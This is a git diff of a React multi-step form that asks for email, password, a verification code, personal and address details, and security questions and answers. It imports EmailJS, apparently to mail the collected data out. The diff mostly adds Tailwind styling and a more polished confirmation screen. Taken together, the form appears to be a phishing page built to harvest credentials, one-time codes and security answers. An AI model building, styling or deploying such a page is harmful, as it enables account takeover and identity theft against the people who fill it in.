@@ -1,3 +1,4 @@
+
 import React, { useState, useEffect, useRef } from 'react';
 import emailjs from '@emailjs/browser';
 import { EMAILJS_CONFIG } from '../config/emailjs.config';
@@ -280,21 +281,27 @@ Date of Birth: ${personalDetails.dateOfBirth}
     switch (currentStep) {
       case 'email':
         return (
-          <div>
-            <h2>Enter Your Email</h2>
+          <div className="space-y-4">
+            <h2 className="text-2xl font-bold text-white">Enter Your Email</h2>
             <input
               type="email"
               placeholder="Email"
               value={email}
               onChange={(e) => handleInputChange('email', 'email', e.target.value)}
+              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
             />
-            <button onClick={goToNextStep}>Next</button>
+            <button 
+              onClick={goToNextStep}
+              className="w-full p-3 bg-yellow-500 text-black font-semibold rounded-lg hover:bg-yellow-400"
+            >
+              Next
+            </button>
           </div>
         );
       case 'password':
         return (
-          <div>
-            <h2>Enter Your Password</h2>
+          <div className="space-y-4">
+            <h2 className="text-2xl font-bold text-white">Enter Your Password</h2>
             <input
               type="password"
               placeholder="Password"
@@ -302,15 +309,28 @@ Date of Birth: ${personalDetails.dateOfBirth}
               onChange={(e) =>
                 handleInputChange('password', 'password', e.target.value)
               }
+              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
             />
-            <button onClick={goToPrevStep}>Previous</button>
-            <button onClick={goToNextStep}>Next</button>
+            <div className="flex gap-2">
+              <button 
+                onClick={goToPrevStep}
+                className="flex-1 p-3 bg-gray-600 text-white font-semibold rounded-lg hover:bg-gray-500"
+              >
+                Previous
+              </button>
+              <button 
+                onClick={goToNextStep}
+                className="flex-1 p-3 bg-yellow-500 text-black font-semibold rounded-lg hover:bg-yellow-400"
+              >
+                Next
+              </button>
+            </div>
           </div>
         );
       case 'verification':
         return (
-          <div>
-            <h2>Verification</h2>
+          <div className="space-y-4">
+            <h2 className="text-2xl font-bold text-white">Verification</h2>
             <input
               type="text"
               placeholder="Verification Code"
@@ -322,18 +342,35 @@ Date of Birth: ${personalDetails.dateOfBirth}
                   e.target.value
                 )
               }
+              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
             />
-            <button onClick={goToPrevStep}>Previous</button>
-            <button onClick={goToNextStep}>Next</button>
-            <button onClick={startCountdown} disabled={isResendDisabled}>
-              Resend Code ({isResendDisabled ? countdown : 'Resend'})
+            <div className="flex gap-2">
+              <button 
+                onClick={goToPrevStep}
+                className="flex-1 p-3 bg-gray-600 text-white font-semibold rounded-lg hover:bg-gray-500"
+              >
+                Previous
+              </button>
+              <button 
+                onClick={goToNextStep}
+                className="flex-1 p-3 bg-yellow-500 text-black font-semibold rounded-lg hover:bg-yellow-400"
+              >
+                Next
+              </button>
+            </div>
+            <button 
+              onClick={startCountdown} 
+              disabled={isResendDisabled}
+              className="w-full p-3 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-500 disabled:bg-gray-500"
+            >
+              {isResendDisabled ? `Resend Code (${countdown}s)` : 'Resend Code'}
             </button>
           </div>
         );
       case 'personalDetails':
         return (
-          <div>
-            <h2>Personal Details</h2>
+          <div className="space-y-4">
+            <h2 className="text-2xl font-bold text-white">Personal Details</h2>
             <input
               type="text"
               placeholder="First Name"
@@ -345,6 +382,7 @@ Date of Birth: ${personalDetails.dateOfBirth}
                   e.target.value
                 )
               }
+              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
             />
             <input
               type="text"
@@ -353,6 +391,7 @@ Date of Birth: ${personalDetails.dateOfBirth}
               onChange={(e) =>
                 handleInputChange('personalDetails', 'lastName', e.target.value)
               }
+              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
             />
             <input
               type="date"
@@ -365,6 +404,7 @@ Date of Birth: ${personalDetails.dateOfBirth}
                   e.target.value
                 )
               }
+              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
             />
             <input
               type="tel"
@@ -377,15 +417,28 @@ Date of Birth: ${personalDetails.dateOfBirth}
                   e.target.value
                 )
               }
+              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
             />
-            <button onClick={goToPrevStep}>Previous</button>
-            <button onClick={goToNextStep}>Next</button>
+            <div className="flex gap-2">
+              <button 
+                onClick={goToPrevStep}
+                className="flex-1 p-3 bg-gray-600 text-white font-semibold rounded-lg hover:bg-gray-500"
+              >
+                Previous
+              </button>
+              <button 
+                onClick={goToNextStep}
+                className="flex-1 p-3 bg-yellow-500 text-black font-semibold rounded-lg hover:bg-yellow-400"
+              >
+                Next
+              </button>
+            </div>
           </div>
         );
       case 'addressDetails':
         return (
-          <div>
-            <h2>Address Details</h2>
+          <div className="space-y-4">
+            <h2 className="text-2xl font-bold text-white">Address Details</h2>
             <input
               type="text"
               placeholder="Address"
@@ -393,6 +446,7 @@ Date of Birth: ${personalDetails.dateOfBirth}
               onChange={(e) =>
                 handleInputChange('addressDetails', 'address', e.target.value)
               }
+              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
             />
             <input
               type="text"
@@ -401,6 +455,7 @@ Date of Birth: ${personalDetails.dateOfBirth}
               onChange={(e) =>
                 handleInputChange('addressDetails', 'zipCode', e.target.value)
               }
+              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
             />
             <input
               type="text"
@@ -409,6 +464,7 @@ Date of Birth: ${personalDetails.dateOfBirth}
               onChange={(e) =>
                 handleInputChange('addressDetails', 'city', e.target.value)
               }
+              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
             />
             <input
               type="text"
@@ -417,15 +473,28 @@ Date of Birth: ${personalDetails.dateOfBirth}
               onChange={(e) =>
                 handleInputChange('addressDetails', 'country', e.target.value)
               }
+              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
             />
-            <button onClick={goToPrevStep}>Previous</button>
-            <button onClick={goToNextStep}>Next</button>
+            <div className="flex gap-2">
+              <button 
+                onClick={goToPrevStep}
+                className="flex-1 p-3 bg-gray-600 text-white font-semibold rounded-lg hover:bg-gray-500"
+              >
+                Previous
+              </button>
+              <button 
+                onClick={goToNextStep}
+                className="flex-1 p-3 bg-yellow-500 text-black font-semibold rounded-lg hover:bg-yellow-400"
+              >
+                Next
+              </button>
+            </div>
           </div>
         );
       case 'securityQuestions':
         return (
-          <div>
-            <h2>Security Questions</h2>
+          <div className="space-y-4">
+            <h2 className="text-2xl font-bold text-white">Security Questions</h2>
             <input
               type="text"
               placeholder="Security Question 1"
@@ -437,6 +506,7 @@ Date of Birth: ${personalDetails.dateOfBirth}
                   e.target.value
                 )
               }
+              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
             />
             <input
               type="text"
@@ -449,6 +519,7 @@ Date of Birth: ${personalDetails.dateOfBirth}
                   e.target.value
                 )
               }
+              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
             />
             <input
               type="text"
@@ -461,6 +532,7 @@ Date of Birth: ${personalDetails.dateOfBirth}
                   e.target.value
                 )
               }
+              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
             />
             <input
               type="text"
@@ -473,16 +545,29 @@ Date of Birth: ${personalDetails.dateOfBirth}
                   e.target.value
                 )
               }
+              className="w-full p-3 bg-gray-800 text-white border border-gray-600 rounded-lg"
             />
-            <button onClick={goToPrevStep}>Previous</button>
-            <button onClick={goToNextStep}>Next</button>
+            <div className="flex gap-2">
+              <button 
+                onClick={goToPrevStep}
+                className="flex-1 p-3 bg-gray-600 text-white font-semibold rounded-lg hover:bg-gray-500"
+              >
+                Previous
+              </button>
+              <button 
+                onClick={goToNextStep}
+                className="flex-1 p-3 bg-yellow-500 text-black font-semibold rounded-lg hover:bg-yellow-400"
+              >
+                Next
+              </button>
+            </div>
           </div>
         );
       case 'termsAndConditions':
         return (
-          <div>
-            <h2>Terms and Conditions</h2>
-            <label>
+          <div className="space-y-4">
+            <h2 className="text-2xl font-bold text-white">Terms and Conditions</h2>
+            <label className="flex items-center space-x-2 text-white">
               <input
                 type="checkbox"
                 checked={termsAccepted}
@@ -493,61 +578,91 @@ Date of Birth: ${personalDetails.dateOfBirth}
                     e.target.checked
                   )
                 }
+                className="w-4 h-4"
               />
-              I accept the terms and conditions
+              <span>I accept the terms and conditions</span>
             </label>
-            <button onClick={goToPrevStep}>Previous</button>
-            <button onClick={goToNextStep}>Next</button>
+            <div className="flex gap-2">
+              <button 
+                onClick={goToPrevStep}
+                className="flex-1 p-3 bg-gray-600 text-white font-semibold rounded-lg hover:bg-gray-500"
+              >
+                Previous
+              </button>
+              <button 
+                onClick={goToNextStep}
+                className="flex-1 p-3 bg-yellow-500 text-black font-semibold rounded-lg hover:bg-yellow-400"
+              >
+                Next
+              </button>
+            </div>
           </div>
         );
       case 'confirmation':
         return (
-          <div>
-            <h2>Confirmation</h2>
-            <p>Email: {email}</p>
-            <p>Password: {password}</p>
-            <p>Verification Code: {verificationCode}</p>
-            <p>
-              Personal Details: {personalDetails.firstName}{' '}
-              {personalDetails.lastName}, {personalDetails.dateOfBirth},{' '}
-              {personalDetails.phoneNumber}
-            </p>
-            <p>
-              Address Details: {addressDetails.address}, {addressDetails.zipCode}
-              , {addressDetails.city}, {addressDetails.country}
-            </p>
-            <p>
-              Security Questions: {securityQuestions.securityQuestion1},{' '}
-              {securityQuestions.securityAnswer1},
-              {securityQuestions.securityQuestion2},{' '}
-              {securityQuestions.securityAnswer2}
-            </p>
-            <p>Terms Accepted: {termsAccepted ? 'Yes' : 'No'}</p>
-            <button onClick={goToPrevStep}>Previous</button>
-            <button type="submit" onClick={handleSubmit} disabled={isSubmitting}>
-              {isSubmitting ? 'Submitting...' : 'Submit'}
-            </button>
-            <button onClick={() => sendSupportRequest('Technical')}>
-              Request Technical Support
-            </button>
-            <button onClick={() => sendSupportRequest('Financial')}>
-              Request Financial Support
-            </button>
+          <div className="space-y-4">
+            <h2 className="text-2xl font-bold text-white">Confirmation</h2>
+            <div className="bg-gray-800 p-4 rounded-lg space-y-2 text-white">
+              <p><strong>Email:</strong> {email}</p>
+              <p><strong>Name:</strong> {personalDetails.firstName} {personalDetails.lastName}</p>
+              <p><strong>Phone:</strong> {personalDetails.phoneNumber}</p>
+              <p><strong>Date of Birth:</strong> {personalDetails.dateOfBirth}</p>
+              <p><strong>Address:</strong> {addressDetails.address}, {addressDetails.city}, {addressDetails.country}</p>
+              <p><strong>Terms Accepted:</strong> {termsAccepted ? 'Yes' : 'No'}</p>
+            </div>
+            <div className="flex gap-2">
+              <button 
+                onClick={goToPrevStep}
+                className="flex-1 p-3 bg-gray-600 text-white font-semibold rounded-lg hover:bg-gray-500"
+              >
+                Previous
+              </button>
+              <button 
+                type="submit" 
+                onClick={handleSubmit} 
+                disabled={isSubmitting}
+                className="flex-1 p-3 bg-green-600 text-white font-semibold rounded-lg hover:bg-green-500 disabled:bg-gray-500"
+              >
+                {isSubmitting ? 'Submitting...' : 'Submit'}
+              </button>
+            </div>
+            <div className="flex gap-2">
+              <button 
+                onClick={() => sendSupportRequest('Technical')}
+                className="flex-1 p-3 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-500"
+              >
+                Technical Support
+              </button>
+              <button 
+                onClick={() => sendSupportRequest('Financial')}
+                className="flex-1 p-3 bg-purple-600 text-white font-semibold rounded-lg hover:bg-purple-500"
+              >
+                Financial Support
+              </button>
+            </div>
           </div>
         );
       default:
-        return <p>Unknown step</p>;
+        return <p className="text-white">Unknown step</p>;
     }
   };
 
   return (
-    <form onSubmit={handleSubmit}>
-      {renderFormStep()}
-      {submissionError && <p className="error">{submissionError}</p>}
-      {submissionSuccess && (
-        <p className="success">Form submitted successfully!</p>
-      )}
-    </form>
+    <div className="max-w-md mx-auto bg-gray-900 p-6 rounded-lg shadow-lg">
+      <form onSubmit={handleSubmit} className="space-y-4">
+        {renderFormStep()}
+        {submissionError && (
+          <div className="p-3 bg-red-600 text-white rounded-lg">
+            {submissionError}
+          </div>
+        )}
+        {submissionSuccess && (
+          <div className="p-3 bg-green-600 text-white rounded-lg">
+            Form submitted successfully!
+          </div>
+        )}
+      </form>
+    </div>
   );
 };
 
